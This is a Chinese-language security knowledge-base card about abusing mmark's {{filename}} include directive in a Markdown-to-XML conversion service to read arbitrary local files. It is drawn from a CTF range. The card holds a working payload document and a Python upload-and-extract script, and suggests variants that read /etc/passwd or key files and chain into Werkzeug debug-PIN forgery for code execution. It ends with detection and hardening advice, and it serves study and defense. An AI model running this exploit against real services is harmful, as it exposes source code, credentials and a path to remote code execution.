---
id: web-generic-file-inclusion-mmark-include-directive-file-read
title: 文档转换服务调用 mmark 时 {{filename}} 包含指令读取任意本地文件
type: scenario
domain: web
path: web/generic/file-inclusion
technique: mmark-include-directive-file-read
tags:
- file-inclusion
- mmark
- markdown
- document-conversion
- arbitrary-file-read
- windows
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V15
  verified_at: '2026-11-05T01:53:01+08:00'
  notes: 已对照原文与图02核对：mmark 以 <{{run.py}} 代码块形式包含 run.py，输出 XML 的 <sourcecode type="py"> 中回显 app.__module__ = "random_string"；原文实测裸 {{run.py}} 报错，卡已注明。原文为 2025 强网杯 RealWorld 靶场，未声明组件版本。PoC 未在本机执行；frontmatter 无 sources/source_url。
url: /docs/web/generic/file-inclusion/web-generic-file-inclusion-mmark-include-directive-file-read/
draft: false
kb_aliases:
- mmark 文件包含
- mmark include 任意文件读取
- '{{filename}} 包含指令'
- IETF author-tools 文件读取
- markdown 转换器读文件
---

## 一句话结论

Web 应用把用户上传的 Markdown 交给 mmark 转换时，mmark 的 `{{filename}}` 包含指令会把本地文件内容内联进渲染结果；攻击者上传含 `<{{run.py}}` 的文档并下载转换产物，即可读取应用源码、配置等任意可读文件。

## 原理

- mmark 是 Markdown 到 XML/其他格式的转换器，支持用 `{{filename}}` 把另一个文件的内容包含进来，且路径可以是绝对路径或相对于处理上下文的路径。
- 目标应用（IETF Author Tools 类 RFC 转换服务）接收用户上传的 `.md`，通过 `subprocess` 调 `mmark` 渲染，再把生成的 XML 文件经 nginx 反代返回给用户。
- 应用只用 `werkzeug.secure_filename()` 清洗了“上传文件名”，没有处理“文件内容”；包含指令写在内容里，直接进入外部转换器。
- 转换器以服务进程权限打开被包含文件，把内容写入输出 XML；输出又被原样返回，构成“读文件—回显”闭环。
- 成立的关键是：用户可控内容 + 具备本地文件读取能力的转换器 + 转换结果回传给用户，三者缺一不可。

## 触发条件

- 应用接受用户文档并调用 mmark（或同样支持包含指令的转换器）进行解析/渲染。
- 渲染结果会返回给用户（直接响应、下载链接或对象存储 URL 均可）。
- 服务进程对目标文件有读权限。
- mmark 的包含功能未被禁用，且内容过滤未拦截 `{{`、`<%` 等标记。

## 利用步骤

1. 找一个能通过格式校验的合法 mmark 文档作为骨架，保留 `title`、`abbrev`、`ipr`、`seriesInfo`、`author` 等元数据，否则转换可能因缺少元数据失败。
2. 在正文中放入包含指令，例如 `<{{run.py}}`。原文实测 `{{run.py}}` 会报错，写成代码块形式 `<{{run.py}}` 才能成功；按需改成 `../` 相对路径或绝对路径。
3. 通过上传/渲染接口提交文档（原文为 `POST /api/render/xml`）。
4. 从响应 JSON 取输出文件 URL，下载转换结果；被包含文件的内容会出现在 XML 的 `<sourcecode>` 等节点中。
5. 用正则从回显中提取目标内容（如 `app.__module__`、数据库口令、密钥）。

## PoC

最小载荷（保留元数据骨架）：

```markdown
%%%
title = "octane protocol"
abbrev = "oct"
ipr= "trust200902"
area = "Internet"
submissiontype = "IETF"
keyword = [""]

[seriesInfo]
name = "RFC"
value = "1"
stream = "IETF"
status = "informational"

[[author]]
initials = "oct"
surname = "octane"
fullname = "cycloctane"
%%%

{mainmatter}

<{{run.py}}
```

渲染并取回结果：

```python
from io import BytesIO
import re, requests
from yarl import URL

base = URL.build(scheme="http", host="target", port=80, path="/")
sess = requests.Session()

with BytesIO(open("payload.md", "rb").read()) as f:
    resp = sess.post(str(base / "api/render/xml"),
                     files={"file": ("draft.md", f, "text/markdown")})

# 应用返回的 url 可能带 Windows 反斜杠，按实际路径修正
urlpath = URL(resp.json()["url"]).path.replace("\\", "/")
text = sess.get(str(base.with_path(urlpath))).text
print(re.search(r'app\.__module__ = "([^"]+)"', text).group(1))
```

成功标志：返回的 XML 中出现目标文件内容。原文以此读出 `run.py` 并取得 `app.__module__` 的值。

## 变体与关联

- 变体：包含 `/etc/passwd`、应用配置、密钥文件；用多级 `../` 从上传目录跳出。
- 变体：其他支持 include 指令的文档工具（Pandoc 的部分过滤器、模板引擎、`!include` 配置解析）也可能形成同类“转换器读文件并回显”。
- 关联：读到的源码/模块名可作为 [[web-python-framework-flask-werkzeug-debug-pin-forgery]] 的 public_bits 输入，进一步升级为 RCE。
- 边界：若应用在沙箱中运行转换器、或转换结果不返回给用户、或禁用包含指令，本手法不成立。

## 检测与防御

- 检测：上传内容中出现 `{{`、`<%`、`!include` 等包含语法；转换进程访问上传目录之外的路径；渲染结果包含源码特征（`import`、`SECRET`、`password`）。
- 防御：禁用转换器的文件包含功能；对用户内容做语法级过滤并拒绝包含指令；转换器运行在无源码/无凭据的低权限容器或 chroot 中；限制 subprocess 的 cwd 与文件系统权限；仅返回净化后的转换结果，不回显完整中间文件。
- 加固：上传目录与代码目录分离，服务进程账号不可读应用源码、环境变量与凭据文件。
